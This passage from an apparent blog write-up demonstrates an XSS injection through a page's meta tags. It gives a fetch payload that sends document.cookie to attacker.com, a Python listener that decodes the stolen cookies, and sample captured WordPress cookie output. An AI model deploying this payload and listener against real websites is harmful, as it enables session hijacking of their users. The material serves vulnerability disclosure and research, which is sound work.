# :globe_with_meridians: A simple python listener to capture the exfiltrated cookies

---

## Triggering the Payload & Exfiltrating Data

Since `<meta>` tags are non-visible and head-elements by default, they don't trigger typical interaction events like `onclick`. However, an attacker can trigger them programmatically or chain them with CSS breakout techniques.

## Get Sandiyo Christan’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

For validation, we can trigger the event handlers via the browser console:

```
document.querySelector('meta[property="og:title"]').onmouseover();
```

To demonstrate real impact, the payload injected into the `description` tag was designed to read the victim's session cookies, encode them in Base64, and exfiltrate them to an external listener:

```
fetch('http://attacker.com/?c=' + btoa(document.cookie))
```

I set up a lightweight Python HTTP receiver (`listener.py`) to capture and automatically decode the exfiltrated cookies:

```
# A simple python listener to capture the exfiltrated cookies
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import base64
```

```
class RequestHandler(BaseHTTPRequestHandler):
def do_GET(self):
self.send_response(200)
self.send_header('Access-Control-Allow-Origin', '*')
self.end_headers()
print(f"\n[+] Incoming Request Path: {self.path}")
parsed_path = urllib.parse.urlparse(self.path)
params = urllib.parse.parse_qs(parsed_path.query)
if 'c' in params:
val = params['c'][0]
try:
decoded = base64.b64decode(val).decode('utf-8')
print(f"[*] Decoded 'c': {decoded}")
except:
print(f"[*] Raw 'c': {val}")
self.wfile.write(b"OK")
```

Once the event was triggered, the listener successfully intercepted the session details:

```
[+] Incoming Request Path: /?c=d3Atc2V0dGluZ3MtMT11cmxidXR0b24lM0Rub25lOyB3cC1zZXR0aW5ncy10aW1lLTE9MTc3MzkzMzc2Mw==
[*] Decoded 'c': wp-settings-1=urlbutton=none; wp-settings-time-1=1773933763
```

---
